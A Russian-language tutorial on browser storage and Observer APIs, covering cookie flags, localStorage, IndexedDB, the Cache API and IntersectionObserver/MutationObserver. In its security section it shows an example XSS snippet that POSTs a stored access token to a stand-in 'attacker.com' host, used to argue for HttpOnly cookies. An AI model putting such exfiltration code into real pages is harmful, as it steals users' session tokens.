Хранилища в браузере

Зачем

  • Сохранить токен авторизации между перезагрузками
  • Запомнить тему, язык, последний фильтр
  • Корзина, черновик формы, незавершённое действие
  • Кэш ответов API - не ходить на сервер каждый раз
  • Оффлайн-режим - PWA, мессенджер без интернета

Что есть в браузере

Cookies
->
Маленькие, шлются на сервер с каждым запросом - для сессии и аутентификации
Web Storage
->
localStorage и sessionStorage - простой key-value, только строки
IndexedDB
->
База данных в браузере - для больших объёмов и оффлайна
Cache API
->
Кэш HTTP-ответов - живёт рядом с Service Worker

Что не хранилище

Переменные в JS, состояние React-компонентов, Zustand store - всё это живёт только пока вкладка открыта

Перезагрузил - потерял. Если нужно пережить F5 - нужно одно из четырёх выше

Cookies

Откуда взялись

HTTP stateless - сервер не помнит, что было в прошлом запросе

Netscape, 1994: добавили заголовок Set-Cookie - сервер просит браузер запомнить пару ключ-значение и присылать её обратно

Сервер
->
Set-Cookie: sid=abc
->
Браузер хранит
->
Cookie: sid=abc
->
Сервер

Анатомия cookie

Set-Cookie: sessionId=abc123; Domain=example.com; Path=/;
            Expires=Wed, 21 Oct 2026 07:28:00 GMT;
            Secure; HttpOnly; SameSite=Lax
  • name=value - сами данные
  • Domain, Path - где cookie действует
  • Expires / Max-Age - когда удалится
  • Secure, HttpOnly, SameSite - флаги безопасности

Domain и Path

Set-Cookie: token=...; Domain=example.com; Path=/api
  • Domain=example.com - cookie уходит на example.com и все поддомены
  • Без атрибута - только на тот хост, что её поставил, без поддоменов
  • Path=/api - cookie уходит только на пути, начинающиеся с /api
  • По умолчанию - текущий путь страницы

Время жизни

Session cookie

Без Expires и Max-Age

Удаляется при закрытии браузера

На практике - не всегда, современные браузеры восстанавливают сессии

Persistent cookie

Expires=Wed, 21 Oct 2026...

Max-Age=3600 (секунды)

Max-Age приоритетнее Expires

Чтобы удалить cookie - выставить Max-Age=0 или дату в прошлом

Как cookie попадает в запрос

Браузер сам прикладывает заголовок Cookie ко всем запросам, чей URL подходит под Domain + Path 

GET /api/profile HTTP/1.1
Host: example.com
Cookie: sessionId=abc123; theme=dark

В fetch для cross-origin запросов нужно явное credentials: 'include'

document.cookie

// Чтение - одна большая строка со всеми cookie сразу
document.cookie;
// "sessionId=abc123; theme=dark; lang=ru"

// Запись - одной строкой, со всеми атрибутами
document.cookie = "theme=dark; path=/; max-age=2592000";

// Удаление - такой же `set` с прошедшей датой
document.cookie = "theme=; path=/; max-age=0";

API из 90-х - синхронный, со строками, без обещаний

CookieStore API

Современная замена document.cookie - асинхронный, с объектами 

await cookieStore.set({
    name: 'theme',
    value: 'dark',
    expires: Date.now() + 30 * 24 * 3600 * 1000,
    sameSite: 'lax',
});

const c = await cookieStore.get('theme');
// { name: 'theme', value: 'dark', ... }

cookieStore.addEventListener('change', (e) => {
    console.log('cookie изменилась', e.changed, e.deleted);
});

В Safari пока не поддерживается - проверяйте перед использованием

Secure

Cookie с этим флагом отправляется только по HTTPS

Без него атакующий, перехвативший HTTP-трафик, видит cookie в открытом виде - привет, сессия пользователя

На любой cookie с чувствительными данными - всегда Secure

HttpOnly

Cookie с этим флагом не виден из JS - document.cookie его не вернёт 

// Сервер ставит:
// Set-Cookie: token=eyJ...; HttpOnly; Secure; SameSite=Lax

document.cookie;        // токена тут нет
fetch('/api/me');       // но браузер сам приложит cookie к запросу

Если злоумышленник внедрил XSS - он не сможет украсть токен и отправить его на свой сервер

SameSite

Когда cookie отправлять при переходе с другого сайта на наш

Strict

Только если запрос инициирован с того же сайта

Перешёл по ссылке из почты - не залогинен

Lax

Strict + GET-навигации с другого сайта

Современный дефолт браузеров

None

Отправляется всегда. Только с Secure

Для встраиваемых виджетов и SSO

Это базовая защита от CSRF - чужой сайт не может за вас отправить запрос с вашими куками

First-party и third-party

Открыли shop.com - на странице есть iframe от ads.com

  • First-party - cookie домена страницы (shop.com)
  • Third-party - cookie стороннего домена (ads.com)

3rd-party cookie позволяли рекламным сетям связывать пользователя между сайтами - основа таргетированной рекламы

Cookieless future

  • Safari (ITP) и Firefox - блокируют 3rd-party cookies по умолчанию
  • Chrome много лет обещал то же - в 2024 отказался от полной блокировки, дал пользователю выбор
  • Privacy Sandbox - Topics, Protected Audience API - попытка дать рекламе контекст без слежки
  • Серверный трекинг через свой домен (track.shop.com) обходит ограничения - и ITP с этим борется

GDPR и cookie consent

Если cookie не strictly necessary (сессия, корзина) - перед установкой нужно явное согласие

  • Аналитика, реклама, A/B-тесты - под consent
  • "Принять всё" и "Отклонить всё" должны быть равно доступны
  • Реализуют через CMP - готовый виджет (Cookiebot, OneTrust, Osano)
  • До согласия GTM не должен грузить рекламные пиксели

Лимиты

  • ~4 KB на одну cookie
  • ~50 cookie на домен (зависит от браузера)
  • Уходят в каждом запросе на свой домен - раздули = замедлили все запросы
  • Префикс __Host- заставляет cookie быть Secure, без Domain, с Path=/ - дополнительная защита

Когда использовать

  • Сессионные токены, JWT - HttpOnly + Secure + SameSite=Lax
  • Любые данные, которые нужны серверу для рендера
  • CSRF-токены, A/B-бакеты
  • Большие объёмы - не сюда
  • Чисто клиентские настройки UI - проще localStorage

Web Storage

Зачем появился

Cookies маленькие (4 KB) и улетают на сервер с каждым запросом - даже если данные нужны только на клиенте

В HTML5 добавили Web Storage - простой key-value, который живёт только в браузере и на сервер сам не отправляется

API

localStorage.setItem('theme', 'dark');
localStorage.getItem('theme');     // 'dark'
localStorage.removeItem('theme');
localStorage.clear();              // удалить всё

localStorage.length;               // сколько ключей
localStorage.key(0);               // имя ключа по индексу

// Сахар - можно как с обычным объектом
localStorage.theme = 'dark';
delete localStorage.theme;

localStorage vs sessionStorage

localStorage

Живёт между сессиями

Общий для всех вкладок origin'а

Удалит только пользователь или код

sessionStorage

Живёт пока открыта вкладка

У каждой вкладки свой

Закрыли вкладку - всё стёрлось

API одинаковый - выбор сводится к нужному времени жизни

Scope - origin

localStorage привязан к origin - схема + хост + порт

  • https://app.com и https://api.app.com - разные хранилища
  • http://app.com и https://app.com - тоже разные
  • Iframe с другого origin'а в чужой localStorage не залезет

Только строки

// Любое значение приводится к строке
localStorage.setItem('count', 42);
localStorage.getItem('count');        // "42" - не число

localStorage.setItem('user', { name: 'Аня' });
localStorage.getItem('user');         // "[object Object]"  ← упс

// Правильно - сериализуем JSON
localStorage.setItem('user', JSON.stringify({ name: 'Аня' }));
const user = JSON.parse(localStorage.getItem('user') ?? 'null');

Синхронный API

Все операции блокируют главный поток - на запись/чтение страница не отвечает 

// Записать большой JSON - заметная задержка
const huge = { /* 1 MB данных */ };
localStorage.setItem('cache', JSON.stringify(huge));  // блок ~10-50 мс

// При первом обращении к localStorage браузер
// читает с диска ВСЁ хранилище origin'а сразу

Поэтому большие или частые записи - не сюда. Для этого есть IndexedDB

Лимиты

  • ~5-10 MB на origin (зависит от браузера)
  • Превысил - QuotaExceededError
  • Считается в UTF-16 - русские символы занимают столько же, сколько английские
  • Iframe с того же origin'а ест ту же квоту
try {
    localStorage.setItem('cache', huge);
} catch (e) {
    if (e.name === 'QuotaExceededError') {
        // место кончилось - почистить старое или упасть аккуратно
    }
}

Синхронизация между вкладками

Когда одна вкладка пишет в localStorage - остальные вкладки того же origin'а получают событие 

window.addEventListener('storage', (e) => {
    console.log(e.key);       // 'theme'
    console.log(e.oldValue);  // 'light'
    console.log(e.newValue);  // 'dark'
    console.log(e.url);       // адрес вкладки-инициатора
});

// Сама вкладка-инициатор событие НЕ получает

Удобно для синхронизации логина/логаута между вкладками - без сервера и без WebSocket

Безопасность

localStorage доступен любому JS на странице - своему, чужому, из npm-зависимости, из расширения браузера 

// XSS - и всё ваше хранилище уехало на чужой сервер
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('access_token'),
});

Не для токенов

❌ localStorage

Виден из любого JS

XSS = слив токена

Нужно вручную вставлять в fetch

✅ HttpOnly cookie

Невидим из JS

XSS не утащит токен

Браузер сам прикладывает к запросам

Правило: токены - в HttpOnly cookie, не в localStorage

Что класть нормально

  • Тема, язык, размер шрифта, выбранная валюта
  • Последний открытый раздел, состояние сайдбара
  • Черновик формы - чтобы не потерять при F5
  • Флаги "видел онбординг", "согласился с куками"
  • Если данные утекут - неприятно, но не критично

SSR и localStorage

// На сервере объекта window нет
const Component = () => {
    const theme = localStorage.getItem('theme');  // ❌ ReferenceError
    return <div className={theme}>...</div>;
};

// Читать только в useEffect - после mount
const Component = () => {
    const [theme, setTheme] = useState('light');
    useEffect(() => {
        setTheme(localStorage.getItem('theme') ?? 'light');
    }, []);
    return <div className={theme}>...</div>;
};

Минус - вспышка светлой темы перед переключением. Лечится cookie с темой и SSR

IndexedDB

Зачем

  • localStorage - 5 MB и синхронный, для большого не подходит
  • Нужно хранить десятки тысяч записей и искать по ним
  • Оффлайн-режим - PWA, мессенджеры, заметки
  • Кэш ассетов и API-ответов рядом с Service Worker

Что это

  • NoSQL key-value база прямо в браузере
  • Хранит структурированные объекты - не обязательно сериализовать
  • Индексы для поиска по полям
  • Транзакции - атомарность операций
  • Полностью асинхронный
  • Привязан к origin'у, как и Web Storage

Терминология

Database
->
Именованная БД с версией - open('app', 3)
Object store
->
Аналог таблицы - набор объектов с одним keyPath
Index
->
Индекс по полю - чтобы искать не по первичному ключу
Transaction
->
Все операции внутри - атомарны. Упало одно - откатилось всё
Cursor
->
Итератор по записям - читать большие наборы постепенно

Открытие БД

const request = indexedDB.open('app', 1);  // имя, версия

request.onsuccess = (e) => {
    const db = e.target.result;
    // работаем с db
};

request.onerror = (e) => {
    console.error('не открылось', e);
};

// Создание/миграция схемы - только тут
request.onupgradeneeded = (e) => {
    const db = e.target.result;
    db.createObjectStore('notes', { keyPath: 'id', autoIncrement: true });
};

Миграции схемы

Схема меняется только в onupgradeneeded - триггерится, когда передали версию больше текущей 

const request = indexedDB.open('app', 3);

request.onupgradeneeded = (e) => {
    const db = e.target.result;
    const oldVersion = e.oldVersion;

    if (oldVersion < 1) {
        db.createObjectStore('notes', { keyPath: 'id' });
    }
    if (oldVersion < 2) {
        const tx = e.target.transaction;
        tx.objectStore('notes').createIndex('byTag', 'tag');
    }
    if (oldVersion < 3) {
        db.createObjectStore('drafts', { keyPath: 'id' });
    }
};

Object store

// keyPath - какое поле объекта будет ключом
db.createObjectStore('users', { keyPath: 'id' });

// autoIncrement - ключи генерируются сами
db.createObjectStore('logs', { keyPath: 'id', autoIncrement: true });

// Out-of-line ключ - ключ передаётся отдельно от объекта
db.createObjectStore('settings');  // нет keyPath
store.put({ value: 'dark' }, 'theme');  // ключ - 'theme'

Транзакции

const tx = db.transaction(['notes'], 'readwrite');
const store = tx.objectStore('notes');

store.add({ id: 1, title: 'Первая заметка' });
store.put({ id: 2, title: 'Вторая' });

tx.oncomplete = () => console.log('всё закоммитилось');
tx.onerror = () => console.error('откатилось');
  • readonly или readwrite
  • Транзакция автокоммитится, когда microtasks разойдутся
  • Нельзя await чужого промиса в середине - транзакция закроется

CRUD

const store = db.transaction('notes', 'readwrite').objectStore('notes');

// Create
store.add({ id: 1, title: 'Новая' });   // упадёт, если ключ уже есть

// Read
store.get(1).onsuccess = (e) => console.log(e.target.result);
store.getAll().onsuccess = (e) => console.log(e.target.result);

// Update / Upsert
store.put({ id: 1, title: 'Обновлённая' });

// Delete
store.delete(1);
store.clear();

Индексы

// В onupgradeneeded
const store = db.createObjectStore('notes', { keyPath: 'id' });
store.createIndex('byTag', 'tag', { unique: false });
store.createIndex('byTitleTag', ['title', 'tag']);  // составной

// Поиск по индексу
const tx = db.transaction('notes', 'readonly');
const idx = tx.objectStore('notes').index('byTag');

idx.getAll('work').onsuccess = (e) => {
    console.log(e.target.result);  // все заметки с tag === 'work'
};

Курсоры

Когда записей много - getAll съест память. Курсор отдаёт по одной 

const store = db.transaction('notes').objectStore('notes');
const range = IDBKeyRange.bound(100, 200);

store.openCursor(range).onsuccess = (e) => {
    const cursor = e.target.result;
    if (!cursor) return;            // дошли до конца

    console.log(cursor.value);
    cursor.continue();              // следующая запись
};

Боль нативного API

  • Колбэки и события - onsuccess вместо await
  • Многословно - на простой get уходит 5 строк
  • Транзакции автозакрываются - нельзя смешать с обычными промисами
  • Ошибки летают через event.target.error

Поэтому почти всегда используют обёртки

Обёртки

// idb (Jake Archibald) - тонкая Promise-обёртка
import { openDB } from 'idb';

const db = await openDB('app', 1, {
    upgrade(db) {
        db.createObjectStore('notes', { keyPath: 'id' });
    },
});

await db.put('notes', { id: 1, title: 'Заметка' });
const note = await db.get('notes', 1);
const all = await db.getAll('notes');
  • idb - минимальная обёртка над нативным API
  • Dexie.js - ORM-подобный интерфейс, запросы в стиле LINQ
  • localForage - API как у localStorage, под капотом IndexedDB

Квоты

const { quota, usage } = await navigator.storage.estimate();
console.log(usage, '/', quota);  // байт уже занято / всего доступно
  • Лимит обычно - часть от свободного места на диске (десятки процентов)
  • При нехватке места браузер удаляет данные редко используемых сайтов
  • navigator.storage.persist() - попросить не удалять. Браузер показывает запрос

Применения

  • PWA - кэш ассетов и API-ответов вместе с Service Worker
  • Оффлайн-заметки, чек-листы, todo
  • Веб-мессенджер - история сообщений
  • Большой клиентский кэш для аналитических дашбордов
  • Локальный поиск по справочнику

Cache API - кратко

Хранилище HTTP-ответов, не произвольных данных. Используется в Service Worker для PWA 

const cache = await caches.open('v1');

await cache.add('/api/products');             // скачать и положить
await cache.put('/data', new Response('...'));// положить руками

const cached = await cache.match('/api/products');
if (cached) return cached;                    // отдать из кэша

Дерево решений

  • Нужно серверу - cookie
  • Только клиенту, до закрытия вкладки - sessionStorage
  • Только клиенту, надолго, мало данных - localStorage
  • Много данных, поиск по полям, оффлайн - IndexedDB
  • Кэш HTTP-ответов в Service Worker - Cache API

Observer APIs

Паттерн Observer

Подписаться на изменения объекта - получать колбэк, когда что-то меняется

В браузере по этому паттерну сделано целое семейство API - IntersectionObserver, ResizeObserver, MutationObserver, PerformanceObserver...

Зачем понадобились

// Старый способ - слушать scroll и считать руками
window.addEventListener('scroll', () => {
    const rect = el.getBoundingClientRect();    // forced layout
    if (rect.top < window.innerHeight) {
        // элемент в зоне видимости
    }
});
  • scroll летит десятки раз в секунду - перегружает поток
  • getBoundingClientRect вызывает forced layout
  • Дёргается при каждом скролле, даже когда ничего не изменилось

Как сделали observer'ы

  • Колбэк вызывается не на каждое движение, а когда условие реально сработало
  • Браузер сам решает, когда удобно посчитать - не блокирует основной поток
  • Несколько изменений батчатся в один callback
  • Меньше кода - не надо считать пересечения и размеры руками

Общий API

const observer = new XxxObserver((entries) => {
    for (const entry of entries) {
        // entry - что изменилось
    }
});

observer.observe(target, options);   // начать следить
observer.unobserve(target);          // перестать следить за target
observer.disconnect();               // отключить вообще

Все четыре observer'а в браузере выглядят одинаково - выучил один, узнал остальные

IntersectionObserver

Задача

Узнавать, когда элемент пересекается с вьюпортом (или другим контейнером)

  • Lazy load изображений - подгружать перед появлением
  • Бесконечная прокрутка - подгружать страницу N+1
  • Аналитика просмотров - элемент был на экране?
  • Sticky-эффекты, появление по скроллу

Базовое использование

const observer = new IntersectionObserver((entries) => {
    for (const entry of entries) {
        if (entry.isIntersecting) {
            console.log(entry.target, 'появился во вьюпорте');
        }
    }
});

observer.observe(document.querySelector('#hero'));

Опции

new IntersectionObserver(callback, {
    root: null,                  // null = вьюпорт; иначе - элемент-контейнер
    rootMargin: '0px 0px 200px', // расширить зону видимости (как margin)
    threshold: [0, 0.5, 1],      // на каких долях пересечения дёргать callback
});
  • rootMargin: '200px' - сработает за 200px до попадания во вьюпорт
  • threshold: 0.5 - срабатывает, когда видна половина элемента
  • Массив порогов - callback дёргается на каждом

Что в entry

{
    target: HTMLElement,        // сам элемент
    isIntersecting: boolean,    // пересекается ли с root
    intersectionRatio: 0.42,    // какая доля пересекается (0..1)
    intersectionRect: DOMRect,  // прямоугольник пересечения
    boundingClientRect: DOMRect,// рамка элемента
    rootBounds: DOMRect,        // рамка root
    time: 12345,                // performance.now() события
}

Аналитика просмотров

// "Считается просмотром, если 50% карточки было видно > 1 секунды"
const seen = new WeakSet();

const io = new IntersectionObserver((entries) => {
    for (const entry of entries) {
        if (entry.intersectionRatio >= 0.5 && !seen.has(entry.target)) {
            const id = setTimeout(() => {
                seen.add(entry.target);
                track('card-viewed', entry.target.dataset.id);
            }, 1000);
            entry.target._timer = id;
        } else {
            clearTimeout(entry.target._timer);
        }
    }
}, { threshold: 0.5 });

ResizeObserver

Задача

Реагировать на изменение размера элемента - не window, а конкретного блока

Раньше единственное событие - window.resize. Знать, что сайдбар стал шире из-за контента, было нечем

API

const ro = new ResizeObserver((entries) => {
    for (const entry of entries) {
        const { width, height } = entry.contentRect;
        console.log(entry.target, width, 'x', height);
    }
});

ro.observe(el);                                  // дефолт - content-box
ro.observe(el, { box: 'border-box' });           // вместе с padding и border
ro.observe(el, { box: 'device-pixel-content-box' }); // в реальных пикселях устройства

Что в entry

{
    target: HTMLElement,
    contentRect: DOMRectReadOnly,    // удобно, но deprecated
    contentBoxSize:    [{ inlineSize, blockSize }],
    borderBoxSize:     [{ inlineSize, blockSize }],
    devicePixelContentBoxSize: [{ inlineSize, blockSize }],
}

inlineSize и blockSize - размеры в логических осях (учитывают writing-mode)

Применения

  • Адаптивные компоненты - меняем layout, когда контейнер стал узким (до Container Queries)
  • Canvas - подгонять width/height атрибуты под фактический размер
  • Виртуализация списков - пересчитать видимые строки
  • Автоподгонка шрифта под ширину блока

Container queries в JS

const ro = new ResizeObserver(([entry]) => {
    const w = entry.contentRect.width;
    entry.target.classList.toggle('is-narrow',  w < 400);
    entry.target.classList.toggle('is-medium', w >= 400 && w < 800);
    entry.target.classList.toggle('is-wide',   w >= 800);
});

ro.observe(card);

Сегодня то же делает CSS @container - но ResizeObserver остаётся для логики, не только стилей

MutationObserver

Задача

Реагировать на изменения DOM - добавили узел, поменяли атрибут, изменили текст

Чужой код меняет страницу, а вам надо узнать - своих хуков нет, а событие нужно

Что было до

  • DOM Mutation Events - DOMNodeInserted, DOMSubtreeModified...
  • Синхронные - дёргались внутри изменения, при цепочках вешали страницу
  • Удалены из стандарта в 2012, заменены на MutationObserver
  • Новый - асинхронный, батчит изменения, не блокирует мутации

API

const mo = new MutationObserver((records) => {
    for (const record of records) {
        console.log(record.type);         // 'childList' | 'attributes' | 'characterData'
        console.log(record.addedNodes);
        console.log(record.removedNodes);
    }
});

mo.observe(document.body, {
    childList: true,        // следить за добавлением/удалением детей
    attributes: true,       // изменения атрибутов
    characterData: true,    // изменения текстовых нод
    subtree: true,          // рекурсивно по всему поддереву
    attributeOldValue: true,
    attributeFilter: ['class', 'data-state'],  // только эти атрибуты
});

MutationRecord

{
    type: 'attributes',
    target: HTMLElement,           // на ком сработало
    attributeName: 'class',
    oldValue: 'card',              // если попросили attributeOldValue
    addedNodes: NodeList,          // для childList
    removedNodes: NodeList,
    previousSibling: Node | null,
    nextSibling: Node | null,
}

Применения

  • Интеграция с чужим виджетом - переопределить стили в чужой разметке
  • Расширения браузера - реагировать на динамически вставляемый контент сайта
  • Подсветка кода / автокомплит в чужом WYSIWYG
  • Отслеживание появления элемента - "когда модалка отрендерилась"

Ждать появления элемента

function waitFor(selector, root = document) {
    return new Promise((resolve) => {
        const found = root.querySelector(selector);
        if (found) return resolve(found);

        const mo = new MutationObserver(() => {
            const el = root.querySelector(selector);
            if (el) {
                mo.disconnect();
                resolve(el);
            }
        });
        mo.observe(root, { childList: true, subtree: true });
    });
}

const modal = await waitFor('.modal');

Производительность

  • subtree: true на document.body - наблюдаем за всем
  • При активном UI callback дёргается часто - надо дёшево фильтровать в нём
  • Не используйте MutationObserver для своего React/Vue кода - там есть нормальные хуки
  • Это инструмент для интеграций с чужим кодом, не для повседневной разработки

Остальные observer'ы

PerformanceObserver

Подписка на метрики производительности - LCP, CLS, INP, long tasks, ресурсы 

new PerformanceObserver((list) => {
    for (const entry of list.getEntries()) {
        console.log(entry.name, entry.startTime, entry.duration);
    }
}).observe({ type: 'largest-contentful-paint', buffered: true });

buffered: true - получить события, которые случились ДО подписки. Удобно для метрик стартовой отрисовки

ReportingObserver

Браузер хочет рассказать про deprecation, intervention, нарушения CSP - всё это летит сюда 

new ReportingObserver((reports) => {
    for (const r of reports) {
        // r.type === 'deprecation' | 'intervention' | 'csp-violation'
        sendToAnalytics(r.type, r.body);
    }
}, { buffered: true }).observe();
